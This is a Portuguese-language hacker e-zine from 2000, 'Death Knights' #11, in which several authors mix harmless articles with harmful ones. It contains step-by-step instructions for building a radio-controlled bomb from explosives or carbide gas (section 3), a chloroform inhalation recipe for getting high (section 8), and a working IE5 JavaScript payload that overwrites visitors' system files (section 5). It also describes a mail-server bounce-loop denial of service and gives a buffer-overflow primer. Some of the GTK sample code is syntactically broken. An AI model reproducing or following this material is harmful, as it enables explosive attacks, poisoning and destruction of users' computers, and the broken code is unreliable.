@@ -1,0 +1,1206 @@
+         _____________            ________            ___________
+         ___  __/__  /______      ___  __ \__________ __  /___  /_
+         __  /  __  __ \  _ \     __  / / /  _ \  __ `/  __/_  __ \
+         _  /   _  / / /  __/     _  /_/ //  __/ /_/ // /_ _  / / /
+         /_/    /_/ /_/\___/      /_____/ \___/\__,_/ \__/ /_/ /_/
+
+             ______ __      _____        ______ _____
+             ___  //_/_________(_)______ ___  /___  /________
+             __  ,<  __  __ \_  /__  __ `/_  __ \  __/_  ___/
+             _  /| | _  / / /  / _  /_/ /_  / / / /_ _(__  )
+             /_/ |_| /_/ /_//_/  _\__, / /_/ /_/\__/ /____/
+                                 /____/
+
+ ______________________________Death_Knights_________________________________
+ ----------------------------------------------------------------------------
+
+                        Data estelar:  1.0975422957
+                        Data terrestre:  15/07/2000
+
+DeathKnights #11a
+
+e-mail: death@DeathKnights.com
+
+page: http://www.DeathKnights.com
+
+     melhor visualizado com joe -asis e terminal com setfont alt-8x16. (linux)
+                           melhor visualizado com edit.                (dos)
+
+ ______________________________Death_Knights_________________________________
+ ----------------------------------------------------------------------------
+
+.-----------.
+|   SECOES   \_______________________________________________________________
+`----------------------------------------------------------------------------'
+
+[1]==[ Esclarecimentos & algo mais...               ] [ Cacaio         ]==[1]
+[2]==[ Aprenda GTK+ (primeiros passos)              ] [ DaveMustaine   ]==[2]
+[3]==[ Bomba a controle remoto                      ] [ OvEr_DeAtH     ]==[3]
+[4]==[ Mail bleh                                    ] [ Cacaio         ]==[4]
+[5]==[ Bug no I.E. 5.0                              ] [ ]Anjo[         ]==[5]
+[6]==[ turbinando o processador                     ] [ midnight       ]==[6]
+[7]==[ buffer overflow                              ] [ encripty       ]==[7]
+[8]==[ Como fazer lolo'                             ] [ Camalis        ]==[8]
+[9]==[ Seguranca de Dados                           ] [ Cacaio         ]==[9]
+[10]=[ SMB                                          ] [ DaveMustaine   ]=[10]
+[11]=[ Como explorar CGI's                          ] [ Cacaio         ]=[11]
+[11]=[ Brinquedinhos bobos                          ] [ Cacaio         ]=[12]
+[13]=[ Ultimas Palavras                             ] [ Cacaio         ]=[13]
+
+-=[  1  ]=-
+.------------------------------------.
+| = Esclarecimentos & algo mais ... = \______________________________________
+`----------------------------------------------------------------------------'
+
+        Demorou mas saiu.
+
+        Enfim, a edicao 11. Esperada por muitos, que enchiam meu saco quase
+que todo dia pra ver esta edicao. Esperamos nao decepcionar. Na verdade,
+nao esperamos porcaria nenhuma! Fazemos isso por que queremos, se acha ruim,
+nao leia! Ah, agora sim. Muito melhor.
+
+        Nao nos responsabilizamos pela informacao contida neste zine. Se voce
+usar indevidamente qualquer informacao contida aqui, a responsabilidade e' to-
+da sua. Se for pego, preso ou sei la o que, nao nos perturbe e blablabla.
+
+        Ah!!!! Se voce tiver uma materia qualquer e quiser publica-la aqui,
+basta envia-la em modo TEXTO ASCII por e-mail para death@deathknights.com.
+Vamos ler a materia, avaliar e talvez ela seja publicada. Mande qalquer coisa,
+menos badcoms, trojans, hackear via ftp ou afins.
+
+        Se voce nao gostou da informacao contida aqui, nao nos perturbe. O
+problema e' todo seu.
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  2  ]=-
+.------------------------------------.
+| = Aprenda GTK+ (primeiros passos) = \______________________________________
+`----------------------------------------------------------------------------'
+                             por DaveMustaine
+
+Opa, ae... minha primeira materia... espero q vcs gostem =)....mas chega de
+blah blah e vamos ao assunto.
+
+Em primeiro lugar... vamos a um poco da parte "teorica" da GTK+, que tem sua
+funcao... como um programador voltada a Objeto no Linux, espero que voces
+gostem, pois acho q nunca vi uma zine brasileira escrever algo sobre GTK+,
+vc pode usar isso muito e muito bem...
+eh soh pensar...
+
+A GTK+ pode ser Defina em 3 partes..
+
+1. GLIB - Eh uma biblioteca de funcoes de utilidade geral, que poder ser usada
+idependentemente do GTK+, essa bibli. inclui coisas como, alocacao de memoria
+com suporte estendido a depuracao, funcoes para aumentar a portabilidade
+do prog. e cozitas mas...
+
+2. GDK - Eh um conjunto de funcoes graficas, sem q precise usar a XLib.
+
+3. GTK - a GTK eh definida por uma variavel especial (ohhhh), q eh a
+GtkWidget, q contem informacoes cor, posicao na tela, etc... alem do
+GtkWidget, a GTK possui outros varios tipos de variaveis... que saum feitos e
+fornecidos pelo GTK+... algun deles muito bons...
+COMO: gint, guint, gchar, guint64.
+
+blz... um poco de materia... agora pratica... vamo ae =-).
+
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+#include <gtk/gtk.h>
+
+int main (int argc, char **argv) /*acho q jah conhecem de outro lugar hehehe*/
+{
+GtkWidget *janela; /* definir a janela */
+GtkWidget *label;  /* define a frase a ser escrita */
+gtk_init (&argc, &argv);
+janela = gtk_window_new (GTK_WINDOW_TOPLEVEL);  /* cria a janela */
+gtk_container_border_width (GTK_CONTAINER (janela), 10); /* define a borda e tal */
+label = gtk_label_new ("Hello World uehuae"); /* escreve a frase */
+gtk_container_add (GTK_CONTAINER (janela), label); /* adiciona a janela + label */
+gtk_widget_show (label);
+gtk_widget_show (janela); /* mostra as duas na tela...*/
+gtk_main();
+return (0);
+}
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+gcc -o hello hello.c 'gtk-config -cflags -libs'
+
+LoL hahaha... viram ae... quem tem um poco de nocao de C/C++ aprende rapido
+(naum eh o meu caso :( ), mas tudo bem... a gente aprende um dia hehehe...
+vamos pro 2. prog ?
+
+Esse ae agora eh um poco mais "avancado" q o outro... vamos usar o callback
+nesse... eh uma funcao que executa uma determinada funcao atraves de algum
+botao acionado.
+
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+#include <gtk/gtk.h>
+void hello (GtkWidget *widget, gpointer data) /* essa eh a funcao do callback */
+
+{
+     g_print ("Hello World!\n"); /* jah sabem o q isso faz neh ? hehe */
+
+}
+gint delete_event (GtkWidget *widget, GdkEvent *event, gpointer data)
+ /* delete_event eh umas das funcoes da GTK+ */
+{
+     g_print ("delete)event detectado\n");
+     return (TRUE); /* quando for TRUE, ele ignora a tentativa de sair do programa*/
+}
+
+void destroy (GtkWidget *widget, gpointer data)
+{
+
+      gtk_main_quit();
+}
+
+int main (int argc, char **argv)
+
+{
+      GtkWidget *janela;
+      GtkWidget *botao;
+      gtk_init (&argc, &argv);
+      janela = gtk_window_new (GTK_WINDOW_TOPLEVEL); /* lembram de antes ? */
+      gtk_signal_connect (GTK_OBJECT (janela), "delete_event", GTK_SIGNAL_FUNC (delete_event), NULL);
+      gtk_signal_connect (GTK_OBJECT (janela), "destroy". GTK_SIGNAL_FUNC (destroy), NULL);
+      botao = gtk_button_new_with_label ("Clique aki para sair");
+      gtk_signal_connect (GTK_OBJECT (botao), "clicked", GTK_SIGNAL_FUNC (hello), NULL;
+      gtk_singal_connect_object (GTK_OBJECT (botao), "clicked" GTK_SIGNAL_FUNC (gtk_widget_destroy), GTK_OBJECT (janela));
+      gtk_container_add (GTK_CONTAINER (janela), botao);
+      gtk_widget_show botao (botao);
+      gtk_widget_show (janela);
+      gtk_main ();
+      return (0);
+-------xX !!! Corte Aqui !!! !!! Corte Aqui !!! !!! Corte Aqui !!! Xx-------
+
+Vo explicar um poco... das coisa que eu nao fiz comentario...
+
+- o "destroy" eh criado por nos, e ativado quando a janela princi. for ativada
+- gtk_signal_connect (GTK_OBJECT (janela),"delete_event" ... essa funcao nova...
+uma funcao que conecta a um evento. neste caso o "delete_event".
+
+Ufa... acho q chega por agora... na proxima zine vou mostrar umas funcoes
+novas e eventos novos para nos... eh soh estudar q vc vai aprender...
+
+intel+ pro6
+
+     DaveMustaine
+     `'`'`'`'`'`'
+
+-=[  3  ]=-
+.----------------------------.
+| = Bomba a controle remoto = \______________________________________________
+`----------------------------------------------------------------------------'
+                                por OvEr_DeAtH
+
+Para fazer isso vc vai gastar bastante grana,  mas  voce pode testar ela
+sem estragar o material principal.
+Grande parte do material necessario, sao materiais de Aeromodelismo, por
+tanto, procure lugares onde vendem os mesmos.
+
+Material:
+
+-01 Receptor FM.
+-01 Cristal de frequencia FM (procure frequncias altas como:  72.200  ou
+    perto disso, pois, quanto maior for a freq, maior sera o alcance.)
+-01 Controle de 2 canais FM.
+-01 Servo.
+-01 Bateria de alimentacao do receptor FM
+-01 Capacitor de 220 v.
+-   Fios.
+-01 Lampada de arvore de natal. (opcional)
+-   Polvora, explosivo liquido ou gás de carbureto (a quantidade pode va-
+    riar de acordo com a sua necessidade, quanto + maior sera a explosao)
+    o gas de carbureto, e o mesmo gas usado em maçaricos, vc encontra  em
+    qquer casa de material de contruao.
+
+*******************************CONSTRUCAO********************************
+
+1o) Primeiramente faca a bomba com a polvora, explosivo liquido ou o gas.
+(Obs.: o gas de carbureto e + recomendado)
+
+2o) Depois pegue o receptor FM:
+                                   _
+              _____________________ \
+Entrada do---|--------> |___|  |___| \
+cristal.     |                 |___|  \
+             |                 |___|   \
+             |                 |___|    > Estas sao as
+             |                 |___|   /  entradas dos
+             |                 |___|__/   servos.
+/============|_________________|___|--------------------> Geralmente es-
+   ^                                ta ultima entrada costuma ser da ba-
+   |                                teria alimentadora do receptor e ser
+   |                                vo(em alguns casos esta pode tbm ser
+   |                                a primeira entrada).
+   |
+   |______ este e o fio de antena do receptor vc deve mante-la estendi-
+           da o maximo possivel para obter + alcance de freq.
+
+Obs: A quantidade de entrada de servos varia de acordo com o  receptor,
+por exemplo:
+se o receptor for para uma recepcao de 7 canais, ele vai ter 7 entradas,
+e assim por diante...
+
+dai, encaixe o cristal RECEPTOR de sinais na sua devida entrada.
+(receptor.jpg)
+
+3o) Encaixe o servo no Receptor.
+
+4o) Encaixe a bateria de alimentaao do receptor na sua devida entrada.
+
+5o) Faca um terminal na parte rotativa do servo:
+(veja foto servo.jpg)
+E, depois de feito esse terminal solde um fio nele, e solde a extremidade
+desse fio em um dos terminais do CAPACITOR 220v. Se vc for usar a lampada
+como o dispositivo de explosao, corte o vidro q envolve  akela  "molinha"
+na qual a corrente passa e ilumina, mas c/ muito cuidado p/ nao danificar
+ela, cortando e retirando apenas o vidro que a envolve.
+(Obs: a lampada so funciona se vc for usar a bomba a gas,que vc pode usar
+tanto a lampada como so o capacitor.)
+
+6o) Faca um outro terminal para dar contato no terminal q vc fez no servo
+neste novo terminal solde um fio, solde  a extremidade desse fio a um dos
+terminais da lampada, ou se vc quiser, pode fazer um outro esquema q faa
+com q o CAPACITOR de um curto c/ a carga q ele tem, mas p/ isso,  logica-
+mente q o CAPACITOR tem q estar dentro do corpo da bomba, agora  solde um
+outro fio ligando o outro terminal do capacitor ao outro terminal da lam-
+pada.  Agora,  basta pegar lampada e coloca-la dentro da bomba e fechar o
+buraco desta usado para colocar a lampada,use algo como uma fita isolante
+e feche-o bem lacrado!!!
+
+7o) Agora estamos quase terminando, basta carregar a bateria do controle,
+plugar o cristal "EMISSOR"  de freq. no seu devido encaixe, nao vou fazer
+o diagrama do controle porque isso e muito facil de fazer, se vc nao con-
+seguir fazer isso sozinho, mate-se.
+:-P
+
+8o) Agora junte todo esse material e amolde-os como lhe convem, o ideal e
+faze-lo ocupar menos espaco possivel, vc tem tbm q arrumar um jeito de fa
+ze-los ficarem bem fixos.
+
+9o) Esta parte e uma das mais importantes,voce NAO pode de maneira alguma
+deixar vazando NADA, seja a bomba de polvora, liquido, ou gas, quando  eu
+fiz o teste, fiz c/ o gas de carbureto, acho q assim fika  mais  poderosa
+a explosao, vc e quem decide! Mas seja oq vc decidir, faca direito, colo-
+que uma valvula p/ quando vc encher o corpo da bomba de  gas, ele  apenas
+deixe entrar o gas, nao permitindo seu vazamento, vc tem de  adaptar  com
+cuidado, nao se esquecendo tbm de fazer uma entrada p/ o dispositivo  que
+vai fechar o curto la dentro. Feche bem firme essa entrada c/ o dispositi
+vo la dentro e pronto!! Basta mover a lavanca q esta usando o mesmo canal
+do servo, que vai tudo pelos ares!!!! hehehe...
+
+***OBS.:  Ah, E POR FAVOR NAO ESQUEA DE CARREGAR O CAPACITOR!!!!!!!!!!
+;)
+
+     OvEr_DeAtH
+     `'`'`'`'`'
+
+-=[  4  ]=-
+.--------------.
+| = Mail bleh = \____________________________________________________________
+`----------------------------------------------------------------------------'
+                               por Cacaio
+
+Nao vou escrever nada muito grande, mas so' algo no qual ninguem falou ainda.
+Vou falar sobre loops infinitos de servidores de email.
+
+O que eu mostrarei aqui pode causar consumo de banda e/ou travamento do
+servidor de email.
+
+Isso nao e' do sendmail, do cocomail, msmail, abacatemail ou pirulitomail.
+Pode funcionar em qualquer servidor de email. Ou nao.
+
+Quando um email e' enviado para um usuario desconhecido, o MAILER-DAEMON
+cria um reply para o email do autor pra dizer que o endereco que ele tentou
+enviar a mensagem nao existe. Se algum usuario quiser brincar com os
+headers, pode forcar os servidores de email a consumir muita banda respondendo
+os mails ou ate' travar.
+
+Exemplificando:
+
+eu mando uma mensagem falsa vindo de jaca@osfaya.com pra jaca@osfaya.com,
+sendo que o usuario 'jaca' nao existe. Logo, o servidor de osfaya.com vai
+mandar um reply pra jaca@osfaya.com, e assim por diante (se estiver bem
+configurado nao ;).
+
+Se o servidor estiver mal configurado e isso for possivel, apenas por voce
+mandar umas simples 20 ou 30 mensagens o servidor pode entrar em um loop
+em uma velocidade relativamente grande, comendo banda e processador, e talvez
+ate' travando o servidor.
+
+A solucao? Usar um servidor o qual voce possa configurar tudo. E saber
+configurar.
+
+[]'s
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`'
+
+-=[  5  ]=-
+.--------------------.
+| = Bug no I.E. 5.0 = \______________________________________________________
+`----------------------------------------------------------------------------'
+                                por ]Anjo[
+
+OBS: Essa matria foi escrita apenas como alerta aos perigos de se usar um
+Navegador que tenha erros (Bugs) que possibilitem aäes tÆo prejudiciais ao
+sistema como as descritas abaixo.
+
+O Navegador Infernet Exploder 5.0 permite que uma p gina, executando scripts
+(seja JavaScript ou VBScript) faa a exportaÆo dos Favoritos do IE5, sem
+pedir confirmaÆo ao usu rio, gravando-os em um arquivo.
+
+Essa p gina ou arquivo ficar  com os endereos dos Favoritos em forma de
+links, bastando ao usu rio apenas clicar uma vez nela para ir para a p gina
+"Alvo".
+
+At a¡, nÆo h  muito problema...o m ximo que uma p gina pode fazer  encher
+o HD do cliente com p ginas tendo os Favoritos como conte£do (o que demoraria
+uma dcada).
+
+Um dos problemas de se fazer isso  que quando os Favoritos sÆo exporatado,
+aparece uma mensagem: "A exportaÆo dos Favoritos foi conclu¡da com xito".
+Se isso aparece v rias e v rias vezes, o usu rio teclaria Ctrl+Alt+Del e
+cancelaria o processo.
+
+Porm, isso nÆo  tudo que  permitido fazer com a exportaÆo dos Favoritos.
+Ao executar o comando para a exportaÆo dos Favoritos,  necess rio fornecer
+o caminho e o nome onde ele ficar  gravado. Ex: C:\Windows\Favoritos.html.
+Eu testei v rias vezes, at ter a certeza de que o navegador realmente nÆo
+pediria permissÆo para gravar os favoritos em determinado arquivo.
+
+Foi a¡ que tive a idia de especificar um arquivo j  existente.
+Fiz uma c¢pia de segurana do C:\Windows\Win.ini e executei um comando,
+utilizando JavaScript para poder gravar nesse arquivo que j  existe, para ver
+qual seria a reaÆo do Navegador, descobrindo que o arquivo especificado
+para ser o recipiente dos Favoritos j  existe no HD do cliente...a mensagem
+que apareceu foi essa: "A exportaÆo dos Favoritos foi conclu¡da com xito".
+
+Achei estranho e resolvi abrir o Win.ini para ver o resultado e, qual nÆo
+foi minha surpresa?
+
+Todo o conte£do do Win.ini havia sido trocado pelos Favoritos do IE5.
+
+NÆo acreditei e resolvi especificar o C:\Command.com para verificiar se isso
+aconteceria com um arquivo bin rio...BUMBA...substitu¡do...adeus Command.com
+( ¢bvio que havia feito Backup antes).
+
+EntÆo, creiei uma p gina e a publiquei para ver o resultado.
+Essa p gina tem comandos em JavaScript para substituir arquivos como:
+
+C:\Command.com
+C:\Autoexec.bat
+C:\Config.sys
+C:\Windows\Win.com
+C:\Windows\Win.ini
+C:\Windows\System.ini
+C:\Windows\Command.com
+
+Pedi a um amigo meu que entrasse no site (avisei-o com antecedncia sobre
+o que aconteceria e pedi para que fizesse backup de seus arquivos) e
+descobri que a p gina  letal ao sistema operacional (nada que um disco de
+boot e backups corretos nÆo consertem).
+
+Porm, avanando minha pesquisa, tentei tornar a p gina um tanto mais letal.
+Tentei fazer com que ela sobrescrevesse o Explorer.exe (J  sabia que arquivos
+em execuÆo nÆo podem ser alterados, porm, nÆo costumava nada tentar).
+Tentei tambm fazer com que os seguintes arquivos fossem sobrescritos:
+
+C:\Msdos.sys
+C:\Io.sys
+C:\Windows\System.dat
+C:\Windows\User.dat
+
+Porm, descobri que nÆo d  para substituir arquivos que estejam marcados como
+Somente Leitura.
+
+Bom...chega de explicaÆo e a¡ vai o c¢digo:
+
+<script>
+window.external.ImportExportFavorites(0,"c:\\command.com")
+window.external.ImportExportFavorites(0,"c:\\windows\\command.com")
+window.external.ImportExportFavorites(0,"c:\\config.sys")
+window.external.ImportExportFavorites(0,"c:\\autoexec.bat")
+window.external.ImportExportFavorites(0,"c:\\windows\\win.com")
+window.external.ImportExportFavorites(0,"c:\\windows\\system.ini")
+window.external.ImportExportFavorites(0,"c:\\windows\\win.ini")
+</script>
+
+OBS: Para cada arquivo que for substitu¡do, aparecer  a mensagem:
+"A exportaÆo dos Favoritos foi conclu¡da com xito".
+No caso acima, aparecerÆo 7 mensagens.
+
+Ess c¢digo dentro de uma p gina far  com que o usu rio que entrar nela,
+perca seus arquivos de sistema que estÆo especificados acima (o que, para
+usu rios inexperientes, seria a morte, pois nÆo saberiam utilizar um
+Sys a: c:
+
+O c¢digo pode ser utilizado para substituir qualquer arquivo dentro do
+computador do pobre coitado que estiver utilizando o IE5, desde que:
+
+1§ - Voc conhea sua localizaÆo;
+2§ - NÆo esteja marcado como Somente Leitura ou Escondido.
+
+Se quiser ver como funciona esse c¢digo, entre em:
+
+http://www.cyberspace.org/~logon/tudosobre.html
+
+     ]Anjo[
+     `'`'`'
+
+-=[  6  ]=-
+.-----------------------------.
+| = turbinando o processador = \_____________________________________________
+`----------------------------------------------------------------------------'
+                              por midnight
+
+ae!!!
+Bem, eh a primeira vez que eu estou escrevendo para o zine, bem chega de
+enrolar, vamos ao que interessa!
+
+Aqui eu vou dar uma dica de como deixar seu procesador um pouco mais rapido.
+
+Materiais:
+
+- Pasta termica ( encontrado em casas de eletronica )
+- 01 palito ( pode ser qualquer coisa, - metal )
+
+Como fazer:
+
+Tire o dissipador, pegue a pasta termica e aplique abaixo do dissipador
+
+Agora eh soh colocar o bixu em cima do processador e soh.
+
+                 = = = = = = = =
+                 = = = = = = = =
+                 =============== -> dissipador
+                 @@@@@@@@@@@@@@@ -> pasta
+                 ***************
+                 *************** -> processador
+
+Bem, a diferenca pode ou nao ser sentida fisicamente, mas que isso resolve
+um pouco, melhor ainda se tu adqurir um bom cooler, do tipow big.
+
+ATENCAO: se tu fizer qualquer cagada, naum me encha o saku!!!!!
+
+bem eh soh!
+
+     midnight
+     `'`'`'`'
+
+-=[  7  ]=-
+.--------------------.
+| = buffer overflow = \______________________________________________________
+`----------------------------------------------------------------------------'
+                               por encripty
+
+hm.. como eh dificil encontrar um material, bom, de assembler no Brasil.
+Alias, tirando as mulheres, eu nao sei o q tem de bom aqui.
+unf. Acabando de enxer linguica vamos logo ao q vc quer ler realmente.
+Esse assunto eh meio complicado e se vc nao prestar atencao nos detalhes,
+acabará se perdendo todo.
+Isso aqui eh dedicado akeles que sabem um pouco de C e assembler.
+E EH BASICO!
+
+Dicas:
+[1] Leia esse texto varias vezes.
+[2] Leia tudo que voce encontrar about assembler.
+[3] Leia o "Smashing The Stack For Fun And Profite" de aleph1.
+[4] Leia, leia e leia. So assim voce vai ser alguem na vida.
+
+<-- ok ok.. vamos comecar logo essa droga!
+
+Eu Te pergunto: "Voce conhece assembler, ou ja ouviu falar?"
+Voce me responde: "Ela e gostosa?"
+hmm, monstro, pare de ler agora para o bem de seus neuronios.
+
+-->
+Iremos usar, aqui, a sintaxe AT&T. So pra revisar...
+1. Os nomes dos registradores veem acompanhados de "%":
+Exemplo: %esp
+
+2. A ordem, Origem/Destino:
+Exemplo: movl %esp,%eax ; Poe o valor do sp no ax
+
+3. Formato de valores constantes/imediatos
+Exemplo: movl $_DeathKnights!, %eax
+
+4. Tamanho do operador
+hmm.. isso eh interessante... as instrucoes veem acompanhadas de 'b', 'w' ou
+'l'.
+Sao elas que vap especificar o tamanho do operando. 'b' pra byte, 'w' pra
+word e 'l' pra long.
+exemplo: __asm__("movl %esp,%eax");
+		     |
+		     `-> long.
+
+					O Buffer Overflow!
+
+O que e o famoso "Buffer Overflow"?
+Simples, e quando se poe mais dados do q o buffer suporta =)
+An? entendeu nada? oh my god!...
+
+1- O que e buffer?
+R: Um buffer e apenas um bloco de memoria que armazena varias solicitacoes de
+um mesmo tipo de dado.
+
+2- E daih, como eu vou por mais dados nele, e como eu vou tirar proveito
+disso?
+R: hmmmm... continue lendo...
+
+--Stack
+
+Enquanto o CPU processa dados, ela precisa de um lugar pra rapidamente
+salvar informacoes importantes devido ao espaco limitado
+dos registradores("celulas de memoria").
+Essa informacao e salva no stack, um parte muito especial da memoria que
+pode ser acessada com algumas instrucoes em assembler.
+O stack pode variar em tamanho e posicao.
+
+A primeira coisa  guardada no stack sera  a ultima a ser lida, e a ultima a
+ser guardada sera a primeira  a ser lida, esse sistema e chamado de LIFO,
+ou "last in, first out" (ultimo dentro, primeiro a sair) =).
+
+Olha isso:
+
+                          :   ...                 .
+                          |-----------------------:
+             -2048 bytes  |   local array1[1024]  |  ...
+                          |-----------------------|
+             -1024 bytes  |   local array2[1024]  |  size 1024 bytes
+                          |-----------------------|
+  posicao atual do stack  |   base pointer        |  size 4 bytes
+                          |-----------------------|
+                +4 bytes  |   return adress       |  size 4 bytes
+                          |-----------------------|
+                +4 bytes  :   parâmetros ...      |  ...
+                          .                       :
+
+hmmm... As variaveis sao  diferentes, e a informacao e guardada no stack,
+todo cpu usa um 'stack pointer', para  marcar a posicao atual,
+E chamada  de SP. as partes a serem analisadas  serão o 'local array2'
+e o 'return  address', so isso e necessário para termos root! yes =).
+
+Quando nois executamu algu, o CPU salva um 'return address' no stack,
+se o processo e finalizado, o cpu pula e pega o 'return address'.
+Mas, se o processo salva mais  bytes em uma variavel local do que seu tamanho
+normal, ira acontecer o 'overwrite', ira  sobrescrever  o
+'return address' antigo, e assim sera nomeado 'overflow'.
+
+Se (1024+8)1032 vezes o caractere "x" for escrito no array2 local, o
+processo ira escrever novamente o 'return address'. e o stack ira parecer:
+                           .
+                          :   ...                 .  .
+                          |-----------------------:
+             -2048 bytes  |   local array1[1024]  |  ...
+                          |-----------------------|
+             -1024 bytes  |   1024 times "X"      |  size 1024 bytes
+                          |-----------------------|
+  posicao atual do stack  |      4 times "X"      |  size 4 bytes
+                          |-----------------------|
+                +4 bytes  |      4 times "X"      |  size 4 bytes
+                          |-----------------------|
+                +4 bytes  :   parâmetros ...      |  ...
+                          .                       :
+
+Assim, agora nos poderemos forcar o programa a pular onde nos quisermos!
+ira sera muito interessante. poderemos criar um codigo no 'local variable'.
+
+                            :   ...                 .
+                          |-----------------------:
+             -2048 bytes  |   local array1[1024]  |
+                          |-----------------------|
+             -1024 bytes  |      nosso code       | < -
+                          |-----------------------|    |
+  posicao atual do stack  |   4 bytes de lixo     |    |
+                          |-----------------------|    |
+                +4 bytes  |    jmp pro codigo     | ___|
+                          |-----------------------|
+                +4 bytes  :   parametros ...      |
+                          .                       :
+
+Bem... a continuacao desta materia ficarah para a proxima zine. ("ahhhhhhhh")... pois eh... soh vou continuar se eu tiver retorno de q gostaram e q querem q eu continue.
+
+Bibliografia:
+
+Masters of Brazilian Computing.
+Smashing The Stack For Fun And Profite.
+
+cya
+
+     encripty               encripty@starmedia.com
+     `'`'`'`'               `'`'`'`'`'`'`'`'`'`'`'
+
+-=[  8  ]=-
+.---------------------.
+| = Como fazer lolo' = \_____________________________________________________
+`----------------------------------------------------------------------------'
+                               por Camalis
+
+Caros amigos e Pihuas, vamos ao que interessa para fikar muito doido.
+
+Vamos aos ingredientes:
+
+1 - 1 Vidro de Cloroformio
+2 - 10 Babaloo's
+3 - (opcao alternativa) - 1 tablete de Halls (cereja)
+4 - 1 Frasco de vidro
+5 - 1 pedaco de pano
+
+Preparacao:
+
+Primeiramente, pege o cloro e o babaloo (ou halls) e tire somente as essencias
+do babaloo. Misture bem com o cloro e ponha dentro do frasco de vidro.
+Agite bem antes de usar.
+
+Modo de Uso:
+
+Molhe bem o pano com o liquido de dentro do frasco. Agora, ponha na boca e
+respire com a boca, ateh voce nao conseguir mais.
+Faca esse procedimento 2 ou 3 vezes. Agora, divirta-se!
+
+     Camalis
+     `'`'`'`
+
+-=[  9  ]=-
+.-----------------------.
+| = Seguranca de Dados = \___________________________________________________
+`----------------------------------------------------------------------------'
+                               por Cacaio
+
+Os principios da seguranca sao os seguinte:
+
+- Confidencialidade
+- Integridade
+- Disponibilidade
+
+Os beneficios da seguranca sao reduzir os riscos, viabilizar aplicacoes, dar
+confianca ao executivo e ao usuario, proteger o negocio, e o mais importante:
+aumentar a produtividade.
+
+     .-------------------.
+     | Problema           `------------------------------------.
+     `==========-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+A disseminacao da tecnologia digital e a conexao dos computadores em redes
+criou tantas portas de acesso aos sistemas que ficou facil encontrar uma
+que esteja aberta ou que deixe alguma brecha para os ataques.
+Nao me refiro a portas TCP ou UDP, mas sim a vias, maneiras.
+(esta ultima frase antes que os grandes "criticos" critiquem.
+ ah, ao inves de criticarem, facam melhor.)
+
+As situacoes podem ser as mais diversas, como por exemplo catastrofes,
+problemas ambientais, supressao de servicos, comportamento anti-social e
+acoes criminosas, dentre outras.
+
+     .----------------------------------.
+     | Um pequeno dado, so' pra informar `---------------------.
+     `==========-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+Em um teste feito pelo Departamento de Defesa dos E.U.A., dos 8932 sistemas
+participantes, 7860 foram invadidos com sucesso, de todos apenas 390
+detectaram os ataquea e apenas 19 relataram os ataques.
+
+     .-------------------.
+     | Tipos de Ataque    `------------------------------------.
+     `==========-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+Existem varios tipos de ataque. Aqui estao os mais frequentes:
+
+- Roubo de senhas
+- Engenharia social
+- Bugs e backdoors
+- Falha na autenticacao
+- Falha de protocolo
+- Obtendo informacoes
+- Negacao de servico (DoS)
+
+* Infiltracao deliberada *
+**************************
+
+Tem como objetivos principais o acesso as informacoes dos arquivos, descobrir
+os interesses da informacao dos usuarios, alterar ou destruir arquivos e oter
+livre uso dos recursos do sistema.
+
+* Infiltracao ativa *
+*********************
+
+Infiltrar-se atraveis de canais ativos de comunicacoes.
+
+Meios fisicos: incluem o acesso ao sistema atraves de uma posicao no centro
+de computacao, ou seja, profissionais que ocupam cargos com acesso ao CPD
+e deliberam as informacoes a terceiros; e o roubo de veiculos removiveis de
+armazenamento.
+
+Sapear: envolve o uso do acesso legitimo ao sistema para obtencao de
+informacao nao autorizada.
+
+Usar disfarce: e' a pratica da obtencao de identificacao propria atraves de
+meios improprios (como a gravacao clandestina) e a seguir o acesso ao sistema
+como um legitimo usuario.
+
+Detectar e usar alcapoes: sao dispositivos de hardware, limitacoes de software
+ou pontos de entrada especialmente plantados que permitem que fonte
+nao-autorizada tenha acesso ao sistema.
+
+     .------------------------.
+     | Contaminacao Eletronica `-------------------------------.
+     `==========-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+Pode ser feita por quatro agentes: Virus, Verme, Troia e Ameba.
+
+Virus: programas feitos para danificar dados e/ou causar falhas das mais
+diversas ao sistema.
+
+Verme: tambem conhecido como worm, ele se procria e se espalha. Pode danificar
+dados e o sistema ou nao.
+
+Troia: e' justamente como um cavalo de troia. Caso executado, pode executar
+funcoes como de backdoor, dando acesso remoto, e as mais diversas possiveis.
+
+Ameba: o usuario que mesmo dispondo de todos os meios de protecao ainda
+consegue ser contaminado por um dos meios acima.
+
+Vamos falar mais um pouco sobre virus. Virus e' a forma mais difundida de
+programas de computador. Muitos sao altamente perigosos, criados para destruir
+os dados no seu disco rigido. Outros sao menos ameacadores e outros
+"inofensivos", contudo mesmo estes conhecidos como "inofensivos" custam
+tempo e dinheiro para serem eliminados.
+
+Os virus NUNCA destroem partes fisicas das maquinas, e atacam apenas
+computadores da mesma plataforma.
+
+Os virus podem ser virus de arquivos, de boot, criptografados, mutantes e
+de macro.
+
+Falarei sobre o virus de macro.
+
+Alguns programas como o Lotus AmiPro, Microsoft Word e Microsoft Excel
+permitem que o usuario experiente crie rotinas para agilizar ou personalizar
+o trabalho.
+Estas rotinas sao usadas por algumas pessoas com o intuito de prejudicar
+alguem.
+Virus de macro se incorporam em documentos Lotus AmiPro, Microsoft Word e
+Microsoft Excel. Frequentemente chegam ao micro em arquivos anexados aos
+e-mails recebidos como arquivos texto ou planilhas eletronicas.
+Quando transmitido via e-mail, um arquivo infectado com virus de macro
+e' invisivel aos mecanismos de deteccao. Somente quando o usuario iniciar o
+arquivo anexado ele podera ser detectado e eliminado.
+
+     .-----------------------.
+     | Aumentando a Seguranca `--------------------------------.
+     `==========-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+Para ter uma seguranca maior, sempre tenha os seguintes cuidados:
+
+Cuidados gerais: mantenha backup de seus dados, mantenha seu computador
+organizado, restrinja o acesso de estranhos ao computador, e esteja atento
+a sinais anormais na funcionalidade do computador.
+
